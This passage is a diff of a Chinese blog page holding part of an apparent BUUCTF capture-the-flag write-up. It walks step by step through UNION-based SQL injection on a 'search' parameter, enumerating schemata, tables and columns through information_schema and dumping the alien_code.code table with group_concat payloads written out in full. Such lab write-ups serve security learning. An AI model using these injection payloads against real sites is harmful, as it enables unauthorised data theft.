+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408103158993.png" alt="image-20220408103158993"></p>
+<p>但是这里并没有什么可以的表，猜测是不是有其他库，重新去看一下库名</p>
+<p>这里用database()只能看到一个aliens库，因为database()只能看到当前库，下次记得一定要把所有库都查出来</p>
+<p>用<code>union+select+1,group_concat(schema_name)+from+information_schema.schemata</code>这个语句可以注出另外两个库<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104227983.png" alt="image-20220408104227983"></p>
+<p>看一下alien_code库</p>
+<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104425032.png" alt="image-20220408104425032"></p>
+<p>再看看code表</p>
+<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name&#x3D;&#39;code&#39;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104548291.png" alt="image-20220408104548291"></p>
+<p>爆字段</p>
+<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(id,code)+from+alien_code.code</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104808831.png" alt="image-20220408104808831"></p>
 
                 
             </div>
@@ -1796,7 +2204,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">159.8k</span>
+                        class="white-color">170k</span>
             
             
             
